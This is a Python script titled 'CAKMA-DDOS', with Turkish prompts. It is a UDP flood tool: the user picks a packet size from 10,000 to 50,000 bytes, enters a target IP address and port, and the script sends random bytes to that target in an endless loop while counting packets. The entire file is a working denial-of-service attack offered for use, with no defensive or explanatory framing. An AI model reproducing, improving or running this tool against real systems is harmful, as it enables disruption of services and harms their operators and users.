import os
import random 
import socket
import colorama
from colorama import Fore, Back, Style
os.system ('python -m pip install colorama')
os.system ('clear')
os.system ('pip install pyfiglet')
os.system('clear')
os.system ('pyfiglet CAKMA-DDOS')

print(Fore.GREEN)
print ('     1- 10.000 bayt [Başlangıç]')
print ('     2- 20.000 bayt [Başlangıç]')
print(Fore.YELLOW)
print ('     3- 30.000 bayt [Orta seviye]')
print ('     4- 40.000 bayt [Güçlü]')
print(Fore.RED)
print ('     5- 50.000 bayt [Sert attack]')

print(Fore.WHITE)
ddos = input("Seçenek giriniz > ")
if(ddos=="1"):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))

		bytes = random._urandom(10000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="2"):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))

		bytes = random._urandom(20000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="3"):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))

		bytes = random._urandom(30000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="4"):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))

		bytes = random._urandom(40000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

if(ddos=="5"):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))

		bytes = random._urandom(50000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))
